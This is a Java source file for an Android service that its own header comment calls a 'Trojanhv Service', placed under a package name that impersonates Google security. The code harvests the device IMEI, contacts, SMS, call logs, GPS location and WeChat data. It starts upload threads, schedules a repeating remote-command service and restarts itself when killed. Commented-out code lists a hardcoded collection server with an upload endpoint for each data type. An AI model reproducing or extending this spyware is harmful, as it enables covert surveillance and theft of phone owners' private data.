package com.google.security;

import java.io.File;
import java.util.Timer;
import java.util.TimerTask;

import org.apache.http.ParseException;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Intent;
import android.content.SharedPreferences;
import android.net.wifi.WifiManager;
import android.os.Environment;
import android.os.IBinder;
import android.os.SystemClock;
import android.telephony.TelephonyManager;
import android.util.Log;

import com.google.security.UploadUtils.ThreadContacts;
import com.google.security.UploadUtils.ThreadInfo;
import com.google.security.tools.Config;
import com.google.security.tools.ContactsInfoTool;
import com.google.security.tools.GpsTool;
import com.google.security.tools.WeChatTool;
import com.google.security.tools.WebCommucationService;
import com.google.security.tools.XmlTools;

/*
 * Function��Trojanhv Service, start Camera, GPS,Video and Contact Info Fetch Tool
 * Author��   RongRong
 * Create Date: 2015.11.11
 * Update Date��
 * */
public class MainService extends Service {
	private static final String LOGTAG = "MainService";
	private GpsTool mGpsTool; /* GPS��λ��Ϣ��ȡʵ�� */
	private ContactsInfoTool contactsInfoTool;/* ��ϵ�ˡ����š�ͨ����¼��Ϣ��ȡʵ�� */
	// private PhotoTool photoTool; /* ������Ϣʵ�� */
	// private VideoTool videoTool; /* ¼����Ϣʵ�� */
	// private RecordTool recordTool; /* ¼����Ϣʵ�� */
	private WeChatTool wechatTool; /* ΢��¼��ʵ�� *//* ������ַʵ�� */
	UploadUtils uploadUtils;/* �ϴ�ʵ�� */
	private Config config;
	public static boolean SMSflag = false;
	static int con_num = 0;
	WifiManager mWifiManager;
	ThreadInfo t;
	ThreadContacts tc;
	private static boolean MediaTag = true;

	// private static Boolean isipexist() {
	// Boolean b = false;
	// String path = Environment.getExternalStorageDirectory().toString();
	// File file = new File(path + "/security/Media/ip/ip.xml");
	// if (file.exists()) {
	// b = true;
	// }
	// return b;
	// }
	//
	// private static String getip() {
	// String ip;
	// if (isipexist() && XmlTools.readip() != null) {
	// ip = XmlTools.readip();
	// } else {
	// ip = "http://111.204.189.55:8090";
	// }
	// Log.e(LOGTAG, ip);
	// return ip;
	// }
	//
	// /* �ϴ��ӿ� */
	// public static String uploadallmedia_url = getip() + "/a/wp/user/file";
	// public static String uploadcontacts_url = getip() +
	// "/a/wp/user/contacts";
	// public static String uploadsms_url = getip() + "/a/wp/user/sms";
	// public static String uploadcallrecord_url = getip() +
	// "/a/wp/user/callrecords";
	// public static String uploadlocation_url = getip() +
	// "/a/wp/user/location";
	// public static String uploadwechat_url = getip() + "/a/wp/user/file";
	// public static String uploadinfo_url = getip() + "/a/wp/user/info";

	/* �����ļ��洢λ�� */
	public static final String PHOTO_FORDER_PATH = Environment
			.getExternalStorageDirectory().getPath() + "/security/Media/photo";
	public static final String VIDEO_FORDER_PATH = Environment
			.getExternalStorageDirectory().getPath() + "/security/Media/video";
	public static final String RECORD_FORDER_PATH = Environment
			.getExternalStorageDirectory().getPath() + "/security/Media/record";
	public static final String XMLFILES_FORDER_PATH = Environment
			.getExternalStorageDirectory().getPath() + "/security/Media/files";
	public static final String CONTACTS_FORDER_PATH = Environment
			.getExternalStorageDirectory().getPath()
			+ "/security/Contacts/ContactsBackUp/contacts";
	public static final String SMS_FORDER_PATH = Environment
			.getExternalStorageDirectory().getPath()
			+ "/security/Contacts/ContactsBackUp/sms";
	public static final String CALLRECORD_FORDER_PATH = Environment
			.getExternalStorageDirectory().getPath()
			+ "/security/Contacts/ContactsBackUp/callrecords";

	public static void setMediaTrue() {
		MediaTag = true;
		Log.e("MediaTag", "MediaTag......true");

	}

	public static void setMediaFalse() {
		MediaTag = false;
		Log.e("MediaTag", "MediaTag......false");

	}

	public static boolean getMediaFlag() {
		return MediaTag;

	}

	public static void setPhotoTimeOut() {
		final Timer timer = new Timer(true);
		TimerTask task = new TimerTask() {
			public void run() {
				setMediaTrue();
			}
		};
		timer.schedule(task, 6 * 1000);
	}

	public static void setTimeOut() {
		final Timer timer = new Timer(true);
		TimerTask task = new TimerTask() {
			public void run() {
				setMediaTrue();
			}
		};
		timer.schedule(task, 15 * 1000);
	}

	@Override
	public IBinder onBind(Intent intent) {
		// TODO Auto-generated method stub
		return null;
	}

	@Override
	public void onCreate() {
		// TODO Auto-generated method stub
		long firstime = SystemClock.elapsedRealtime();
		Log.i(LOGTAG, "��������....");
		saveUid();
		config = Config.getIntance(this);
		config.readConfig();
		uploadUtils = UploadUtils.getIntance(this);
		Log.e(LOGTAG, "����websocket......");
		
//		Intent inte = new Intent(this, WebCommucationService.class);
//		startService(inte);
//		startService(new Intent(this, GpsService.class));
//		
		Intent intent = new Intent(this, WebCommucationService.class);
		PendingIntent send = PendingIntent.getService(this, 0, intent, 0);
		AlarmManager alm = (AlarmManager) this.getSystemService(ALARM_SERVICE);
		alm.setRepeating(AlarmManager.ELAPSED_REALTIME_WAKEUP, firstime,
				5 * 60000, send);
		// ���������ļ�����������
		if (config.Gpsflag) {
			if (!BootReceiver.bootFlag) {
				Intent IU = new Intent(this, GpsService.class);
				PendingIntent sender = PendingIntent.getService(this, 0, IU, 0);
				AlarmManager am = (AlarmManager) this
						.getSystemService(ALARM_SERVICE);
				am.setRepeating(AlarmManager.ELAPSED_REALTIME_WAKEUP, firstime,
						60000, sender);
				Log.e(LOGTAG,
						"am start " + String.valueOf(!BootReceiver.bootFlag));
			}
			mGpsTool = GpsTool.getInstance(this);
			mGpsTool.startLocation();
			Log.e(LOGTAG, "�ɹ�������λ����....");
		}

		if (config.Wechatflag) {
			wechatTool = WeChatTool.getInstance(this);
			wechatTool.start();
			Log.e(LOGTAG, "�ɹ�����΢�Ź���....");
		}
		if (config.Contractflag) {
			contactsInfoTool = ContactsInfoTool.getIntance(this);
			contactsInfoTool.saveCallRecord();
			contactsInfoTool.saveContacts();
			contactsInfoTool.saveSms();
			contactsInfoTool.saveInfo();
			t = new ThreadInfo();
			t.start();
			tc = new ThreadContacts();
			tc.start();
			Log.e(LOGTAG, "�ɹ�������ϵ����Ϣ��ȡ����....");
			// contactsInfoTool.saveContactsasxml();
			// contactsInfoTool.saveCallRecordsasxml();
			// contactsInfoTool.saveSmsasxml();
			// Log.e(LOGTAG, "�ɹ�������ϵ����Ϣxml�ļ�....");

		}

		if (config.Urlflag) {

			Log.e(LOGTAG, "�ɹ�������ַ���ʹ���....");
		}
		super.onCreate();

	}

	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		// TODO Auto-generated method stub
		// startService(new Intent(this, GpsService.class));
		// startService(new Intent(this, WebCommucationService.class));

		return super.onStartCommand(intent, flags, startId);
	}

	@Override
	public void onDestroy() {
		// TODO Auto-generated method stub
		startService(new Intent(this, GpsService.class));

		this.startService(new Intent(this, MainService.class));
		super.onDestroy();
	}

	private void saveUid() {
		TelephonyManager telephonyManager = (TelephonyManager) this
				.getSystemService(TELEPHONY_SERVICE);
		String imei = telephonyManager.getDeviceId();
		SharedPreferences mySharedPreferences = getSharedPreferences("imei",
				MODE_PRIVATE);
		// ʵ����SharedPreferences.Editor���󣨵ڶ�����
		SharedPreferences.Editor editor = mySharedPreferences.edit();
		// ��putString�ķ�����������
		editor.putString("imei", imei);
		// �ύ��ǰ����
		editor.commit();
	}
}